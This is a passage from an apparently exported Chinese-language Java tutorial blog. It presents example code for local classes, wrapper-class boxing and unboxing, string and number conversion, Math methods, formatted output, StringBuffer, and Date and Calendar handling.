class="type">float</span> armor; <span class="comment">//护甲</span></span><br><span class="line">          </span><br><span class="line">    <span class="type">int</span> moveSpeed; <span class="comment">//移动速度</span></span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span>;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">          </span><br><span class="line">        <span class="comment">//与匿名类的区别在于，本地类有了自定义的类名</span></span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">SomeHero</span> <span class="keyword">extends</span> <span class="title class_">Hero</span>&#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println( name+ <span class="string">&quot; 新的进攻手段&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        <span class="type">SomeHero</span> <span class="variable">h</span>  <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">SomeHero</span>();</span><br><span class="line">        h.name =<span class="string">&quot;地卜师&quot;</span>;</span><br><span class="line">        h.attack();</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="默认方法"><a href="#默认方法" class="headerlink" title="默认方法"></a>默认方法</h5><p>默认方法是JDK8新特性，指的是接口也可以提供具体方法了，而不像以前，只能提供抽象方法.</p><h3 id="8-数字和字符串"><a href="#8-数字和字符串" class="headerlink" title="8.数字和字符串"></a>8.数字和字符串</h3><h4 id="数字封装类"><a href="#数字封装类" class="headerlink" title="数字封装类"></a>数字封装类</h4><p>数字封装类有<br>Byte,Short,Integer,Long,Float,Double<br>这些类都是抽象类Number的子类</p><p>不需要调用构造方法，<strong>通过&#x3D;符号****自动</strong>把 基本类型 转换为 类类型 就叫装箱</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> digit;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestNumber</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//基本类型转换成封装类型</span></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">it</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(i);</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//自动转换就叫装箱</span></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">it2</span> <span class="operator">=</span> i;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不需要调用Integer的intValue方法，通过&#x3D;就自动转换成int类型，就叫拆箱</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> digit;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestNumber</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line">  </span><br><span class="line">        <span class="type">Integer</span> <span class="variable">it</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(i);</span><br><span class="line">          </span><br><span class="line">        <span class="comment">//封装类型转换成基本类型</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> it.intValue();</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//自动转换就叫拆箱</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> it;</span><br><span class="line">          </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>nt的最大值可以通过其对应的封装类Integer.MAX_VALUE获取</p><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><h5 id="数字转字符串："><a href="#数字转字符串：" class="headerlink" title="数字转字符串："></a>数字转字符串：</h5><p>方法1： 使用String类的静态方法valueOf<br>方法2： 先把基本类型装箱为对象，然后调用对象的toString</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> digit;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestNumber</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//方法1</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> String.valueOf(i);</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//方法2</span></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">it</span> <span class="operator">=</span> i;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> it.toString();</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="调用Integer的静态方法parseInt"><a href="#调用Integer的静态方法parseInt" class="headerlink" title="调用Integer的静态方法parseInt"></a>调用Integer的静态方法parseInt</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> digit;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestNumber</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;999&quot;</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="type">int</span> i= Integer.parseInt(str);</span><br><span class="line">         </span><br><span class="line">        System.out.println(i);</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="java-lang-Math"><a href="#java-lang-Math" class="headerlink" title="java.lang.Math"></a>java.lang.Math</h4><p>数学方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> digit;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestNumber</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">float</span> <span class="variable">f1</span> <span class="operator">=</span> <span class="number">5.4f</span>;</span><br><span class="line">        <span class="type">float</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="number">5.5f</span>;</span><br><span class="line">        <span class="comment">//5.4四舍五入即5</span></span><br><span class="line">        System.out.println(Math.round(f1));</span><br><span class="line">        <span class="comment">//5.5四舍五入即6</span></span><br><span class="line">        System.out.println(Math.round(f2));</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//得到一个0-1之间的随机浮点数（取不到1）</span></span><br><span class="line">        System.out.println(Math.random());</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//得到一个0-10之间的随机整数 （取不到10）</span></span><br><span class="line">        System.out.println((<span class="type">int</span>)( Math.random()*<span class="number">10</span>));</span><br><span class="line">        <span class="comment">//开方</span></span><br><span class="line">        System.out.println(Math.sqrt(<span class="number">9</span>));</span><br><span class="line">        <span class="comment">//次方（2的4次方）</span></span><br><span class="line">        System.out.println(Math.pow(<span class="number">2</span>,<span class="number">4</span>));</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//π</span></span><br><span class="line">        System.out.println(Math.PI);</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//自然常数</span></span><br><span class="line">        System.out.println(Math.E);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h4><p>%s 表示字符串<br>%d 表示数字<br>%n 表示换行</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> digit;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestNumber</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span><span class="string">&quot;盖伦&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">kill</span> <span class="operator">=</span> <span class="number">8</span>;</span><br><span class="line">        String title=<span class="string">&quot;超神&quot;</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//直接使用+进行字符串连接，编码感觉会比较繁琐，并且维护性差,易读性差</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">sentence</span> <span class="operator">=</span> name+ <span class="string">&quot; 在进行了连续 &quot;</span> + kill + <span class="string">&quot; 次击杀后，获得了 &quot;</span> + title +<span class="string">&quot; 的称号&quot;</span>;</span><br><span class="line">         </span><br><span class="line">        System.out.println(sentence);</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//使用格式化输出</span></span><br><span class="line">        <span class="comment">//%s表示字符串，%d表示数字,%n表示换行</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">sentenceFormat</span> <span class="operator">=</span><span class="string">&quot;%s 在进行了连续 %d 次击杀后，获得了 %s 的称号%n&quot;</span>;</span><br><span class="line">        System.out.printf(sentenceFormat,name,kill,title);</span><br><span class="line">         </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>printf</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> digit;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestNumber</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span><span class="string">&quot;盖伦&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">kill</span> <span class="operator">=</span> <span class="number">8</span>;</span><br><span class="line">        String title=<span class="string">&quot;超神&quot;</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="type">String</span> <span class="variable">sentenceFormat</span> <span class="operator">=</span><span class="string">&quot;%s 在进行了连续 %d 次击杀后，获得了 %s 的称号%n&quot;</span>;</span><br><span class="line">        <span class="comment">//使用printf格式化输出</span></span><br><span class="line">        System.out.printf(sentenceFormat,name,kill,title);</span><br><span class="line">        <span class="comment">//使用format格式化输出</span></span><br><span class="line">        System.out.format(sentenceFormat,name,kill,title);</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>换行符</strong>就是另起一行 — ‘\n’ 换行（newline）<br><strong>回车符</strong>就是回到一行的开头 — ‘\r’ 回车（return）<br>在eclipse里敲一个回车，实际上是<strong>回车换行符</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> digit;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line">   </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestNumber</span> &#123;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">year</span> <span class="operator">=</span> <span class="number">2020</span>;</span><br><span class="line">        <span class="comment">//总长度，左对齐，补0，千位分隔符，小数点位数，本地化表达</span></span><br><span class="line">          </span><br><span class="line">        <span class="comment">//直接打印数字</span></span><br><span class="line">        System.out.format(<span class="string">&quot;%d%n&quot;</span>,year);</span><br><span class="line">        <span class="comment">//总长度是8,默认右对齐</span></span><br><span class="line">        System.out.format(<span class="string">&quot;%8d%n&quot;</span>,year);</span><br><span class="line">        <span class="comment">//总长度是8,左对齐</span></span><br><span class="line">        System.out.format(<span class="string">&quot;%-8d%n&quot;</span>,year);</span><br><span class="line">        <span class="comment">//总长度是8,不够补0</span></span><br><span class="line">        System.out.format(<span class="string">&quot;%08d%n&quot;</span>,year);</span><br><span class="line">        <span class="comment">//千位分隔符</span></span><br><span class="line">        System.out.format(<span class="string">&quot;%,8d%n&quot;</span>,year*<span class="number">10000</span>);</span><br><span class="line">  </span><br><span class="line">        <span class="comment">//小数点位数</span></span><br><span class="line">        System.out.format(<span class="string">&quot;%.2f%n&quot;</span>,Math.PI);</span><br><span class="line">          </span><br><span class="line">        <span class="comment">//不同国家的千位分隔符</span></span><br><span class="line">        System.out.format(Locale.FRANCE,<span class="string">&quot;%,.2f%n&quot;</span>,Math.PI*<span class="number">10000</span>);</span><br><span class="line">        System.out.format(Locale.US,<span class="string">&quot;%,.2f%n&quot;</span>,Math.PI*<span class="number">10000</span>);</span><br><span class="line">        System.out.format(Locale.UK,<span class="string">&quot;%,.2f%n&quot;</span>,Math.PI*<span class="number">10000</span>);</span><br><span class="line">          </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">     </span><br></pre></td></tr></table></figure><h5 id="字符"><a href="#字符" class="headerlink" title="字符:"></a>字符:</h5><p>保存一个字符的时候使用char</p><p>char对应的封装类是Character</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> character;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestChar</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">         </span><br><span class="line">        System.out.println(Character.isLetter(<span class="string">&#x27;a&#x27;</span>));<span class="comment">//判断是否为字母</span></span><br><span class="line">        System.out.println(Character.isDigit(<span class="string">&#x27;a&#x27;</span>)); <span class="comment">//判断是否为数字</span></span><br><span class="line">        System.out.println(Character.isWhitespace(<span class="string">&#x27; &#x27;</span>)); <span class="comment">//是否是空白</span></span><br><span class="line">        System.out.println(Character.isUpperCase(<span class="string">&#x27;a&#x27;</span>)); <span class="comment">//是否是大写</span></span><br><span class="line">        System.out.println(Character.isLowerCase(<span class="string">&#x27;a&#x27;</span>)); <span class="comment">//是否是小写</span></span><br><span class="line">         </span><br><span class="line">        System.out.println(Character.toUpperCase(<span class="string">&#x27;a&#x27;</span>)); <span class="comment">//转换为大写</span></span><br><span class="line">        System.out.println(Character.toLowerCase(<span class="string">&#x27;A&#x27;</span>)); <span class="comment">//转换为小写</span></span><br><span class="line"> </span><br><span class="line">        <span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span>; <span class="comment">//不能够直接把一个字符转换成字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">a2</span> <span class="operator">=</span> Character.toString(<span class="string">&#x27;a&#x27;</span>); <span class="comment">//转换为字符串</span></span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>length方法返回当前字符串的长度</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>charAt</td><td>获取字符</td><td><a href="https://how2j.cn/k/number-string/number-string-manipulate/325.html#step712">示例代码</a></td></tr><tr><td>toCharArray</td><td>获取对应的字符数组</td><td><a href="https://how2j.cn/k/number-string/number-string-manipulate/325.html#step719">示例代码</a></td></tr><tr><td>subString</td><td>截取子字符串</td><td><a href="https://how2j.cn/k/number-string/number-string-manipulate/325.html#step713">示例代码</a></td></tr><tr><td>split</td><td>分隔</td><td><a href="https://how2j.cn/k/number-string/number-string-manipulate/325.html#step714">示例代码</a></td></tr><tr><td>trim</td><td>去掉首尾空格</td><td><a href="https://how2j.cn/k/number-string/number-string-manipulate/325.html#step715">示例代码</a></td></tr><tr><td>toLowerCase toUpperCase</td><td>大小写</td><td><a href="https://how2j.cn/k/number-string/number-string-manipulate/325.html#step716">示例代码</a></td></tr><tr><td>indexOf lastIndexOf contains</td><td>定位</td><td><a href="https://how2j.cn/k/number-string/number-string-manipulate/325.html#step717">示例代码</a></td></tr><tr><td>replaceAll replaceFirst</td><td></td><td></td></tr></tbody></table><p>使用equals进行字符串内容的比较，必须大小写一致<br>equalsIgnoreCase，忽略大小写判断内容是否一致</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> character;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestString</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;the light&quot;</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="type">String</span> <span class="variable">start</span> <span class="operator">=</span> <span class="string">&quot;the&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">end</span> <span class="operator">=</span> <span class="string">&quot;Ight&quot;</span>;</span><br><span class="line">         </span><br><span class="line">        System.out.println(str1.startsWith(start));<span class="comment">//以...开始</span></span><br><span class="line">        System.out.println(str1.endsWith(end));<span class="comment">//以...结束</span></span><br><span class="line">          </span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> character;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestString</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;let there &quot;</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(str1); <span class="comment">//根据str1创建一个StringBuffer对象</span></span><br><span class="line">        sb.append(<span class="string">&quot;be light&quot;</span>); <span class="comment">//在最后追加</span></span><br><span class="line">         </span><br><span class="line">        System.out.println(sb);</span><br><span class="line">         </span><br><span class="line">        sb.delete(<span class="number">4</span>, <span class="number">10</span>);<span class="comment">//删除4-10之间的字符</span></span><br><span class="line">         </span><br><span class="line">        System.out.println(sb);</span><br><span class="line">         </span><br><span class="line">        sb.insert(<span class="number">4</span>, <span class="string">&quot;there &quot;</span>);<span class="comment">//在4这个位置插入 there</span></span><br><span class="line">         </span><br><span class="line">        System.out.println(sb);</span><br><span class="line">         </span><br><span class="line">        sb.reverse(); <span class="comment">//反转</span></span><br><span class="line">         </span><br><span class="line">        System.out.println(sb);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="时间日历"><a href="#时间日历" class="headerlink" title="时间日历"></a>时间日历</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> date;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestDate</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 当前时间</span></span><br><span class="line">        <span class="type">Date</span> <span class="variable">d1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;当前时间:&quot;</span>);</span><br><span class="line">        System.out.println(d1);</span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="comment">// 从1970年1月1日 早上8点0分0秒 开始经历的毫秒数</span></span><br><span class="line">        <span class="type">Date</span> <span class="variable">d2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="number">5000</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;从1970年1月1日 早上8点0分0秒 开始经历了5秒的时间&quot;</span>);</span><br><span class="line">        System.out.println(d2);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> date;</span><br><span class="line">  </span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestDate</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//注意：是java.util.Date;</span></span><br><span class="line">        <span class="comment">//而非 java.sql.Date，此类是给数据库访问的时候使用的</span></span><br><span class="line">        Date now= <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        <span class="comment">//打印当前时间</span></span><br><span class="line">        System.out.println(<span class="string">&quot;当前时间:&quot;</span>+now.toString());</span><br><span class="line">        <span class="comment">//getTime() 得到一个long型的整数</span></span><br><span class="line">        <span class="comment">//这个整数代表 1970.1.1 08:00:00:000，每经历一毫秒，增加1</span></span><br><span class="line">        System.out.println(<span class="string">&quot;当前时间getTime()返回的值是：&quot;</span>+now.getTime());</span><br><span class="line">          </span><br><span class="line">        <span class="type">Date</span> <span class="variable">zero</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="number">0</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;用0作为构造方法，得到的日期是:&quot;</span>+zero);</span><br><span class="line">          </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System.out.println(&quot;System.currentTimeMillis() \t返回值: &quot;+System.currentTimeMillis());</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span>` `date;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">import</span>` `java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span>` `java.util.Date;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span>` `class` `TestDate &#123;</span><br><span class="line"> </span><br><span class="line">  ``<span class="keyword">public</span>` `<span class="keyword">static</span>` `<span class="keyword">void</span>` `main(String[] args) &#123;</span><br><span class="line">     </span><br><span class="line">    ``<span class="comment">//y 代表年</span></span><br><span class="line">    ``<span class="comment">//M 代表月</span></span><br><span class="line">    ``<span class="comment">//d 代表日</span></span><br><span class="line">    ``<span class="comment">//H 代表24进制的小时</span></span><br><span class="line">    ``<span class="comment">//h 代表12进制的小时</span></span><br><span class="line">    ``<span class="comment">//m 代表分钟</span></span><br><span class="line">    ``<span class="comment">//s 代表秒</span></span><br><span class="line">    ``<span class="comment">//S 代表毫秒</span></span><br><span class="line">    ``<span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span>``<span class="keyword">new</span>` `SimpleDateFormat(``<span class="string">&quot;yyyy-MM-dd HH:mm:ss SSS&quot;</span>` `);</span><br><span class="line">    ``Date d= ``<span class="keyword">new</span>` `Date();</span><br><span class="line">    ``<span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> sdf.format(d);</span><br><span class="line">    ``System.out.println(``<span class="string">&quot;当前时间通过 yyyy-MM-dd HH:mm:ss SSS 格式化后的输出: &quot;</span>``+str);</span><br><span class="line">    </span><br><span class="line">    ``<span class="type">SimpleDateFormat</span> <span class="variable">sdf1</span> <span class="operator">=</span>``<span class="keyword">new</span>` `SimpleDateFormat(``<span class="string">&quot;yyyy-MM-dd&quot;</span>` `);</span><br><span class="line">    ``Date d1= ``<span class="keyword">new</span>` `Date();</span><br><span class="line">    ``<span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> sdf1.format(d1);</span><br><span class="line">    ``System.out.println(``<span class="string">&quot;当前时间通过 yyyy-MM-dd 格式化后的输出: &quot;</span>``+str1);</span><br><span class="line">    </span><br><span class="line">  ``&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> date;</span><br><span class="line">  </span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">import</span> java.util.Calendar;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestDate</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//采用单例模式获取日历对象Calendar.getInstance();</span></span><br><span class="line">        <span class="type">Calendar</span> <span class="variable">c</span> <span class="operator">=</span> Calendar.getInstance();</span><br><span class="line">          </span><br><span class="line">        <span class="comment">//通过日历对象得到日期对象</span></span><br><span class="line">        <span class="type">Date</span> <span class="variable">d</span> <span class="operator">=</span> c.getTime();</span><br><span class="line">  </span><br><span class="line">        <span class="type">Date</span> <span class="variable">d2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="number">0</span>);</span><br><span class="line">        c.setTime(d2); <span class="comment">//把这个日历，调成日期 : 1970.1.1 08:00:00</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> date;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">import</span> java.util.Calendar;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestDate</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Calendar</span> <span class="variable">c</span> <span class="operator">=</span> Calendar.getInstance();</span><br><span class="line">        <span class="type">Date</span> <span class="variable">now</span> <span class="operator">=</span> c.getTime();</span><br><span class="line">        <span class="comment">// 当前日期</span></span><br><span class="line">        System.out.println(<span class="string">&quot;当前日期：\t&quot;</span> + format(c.getTime()));</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 下个月的今天</span></span><br><span class="line">        c.setTime(now);</span><br><span class="line">        c.add(Calendar.MONTH, <span class="number">1</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;下个月的今天:\t&quot;</span> +format(c.getTime()));</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 去年的今天</span></span><br><span class="line">        c.setTime(now);</span><br><span class="line">        c.add(Calendar.YEAR, -<span class="number">1</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;去年的今天:\t&quot;</span> +format(c.getTime()));</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 上个月的第三天</span></span><br><span class="line">        c.setTime(now);</span><br><span class="line">        c.add(Calendar.MONTH, -<span class="number">1</span>);</span><br><span class="line">        c.set(Calendar.DATE, <span class="number">3</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;上个月的第三天:\t&quot;</span> +format(c.getTime()));</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">format</span><span class="params">(Date time)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> sdf.format(time);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
